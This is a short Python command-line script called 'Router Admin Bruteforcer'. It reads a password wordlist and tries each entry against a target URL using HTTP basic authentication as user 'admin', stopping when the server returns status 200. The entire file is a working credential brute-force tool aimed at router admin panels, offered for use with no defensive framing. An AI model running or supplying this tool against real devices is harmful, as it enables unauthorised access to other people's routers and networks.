try:
	import requests, argparse, os, sys
except:
	import os
	os.system('pip3 install requests, argparse')
	import argparse, requests, sys
parser = argparse.ArgumentParser(description='Router Admin Bruteforcer')
parser.add_argument('-u', '--url',help='Enter Target Url')
parser.add_argument('-w', '--wordlist', help='Enter Wordlist')
arg = parser.parse_args()

class RouterBrute:
	def __init__(self, url, wlist):
		self.url = url
		self.wlist = wlist


	def brute(self):
		success = False
		wlist = open(self.wlist).read().splitlines()
		print('user: admin')
		print('password: ?')
		print('='*10+'bruteforcing'+'='*10)
		for passwd in wlist:
			try:
				r = requests.get(self.url, auth=('admin', passwd))
				spacer = ' '*32 #*int(len(passwd))
				sys.stdout.write('\r'+spacer)
				sys.stdout.write(f'\rtrying password: {passwd}')
				if r.status_code == 200:
					success = True
					sys.stdout.write(f'\rPassword Found!: {passwd}')
					break
			except:
				print('Err')
		if success == False:
			print('\rSorry! password not found!\nTry a different wordlist!.')


	def check(self):
		if self.wlist is None:
			self.wlist = 'list.txt'
		if self.url is None:
			os.system('python3 rbrute.v2.py -h')
			exit(0)
		rbrute.brute()


if __name__ == "__main__":
	rbrute = RouterBrute(arg.url, arg.wordlist)
	rbrute.check()
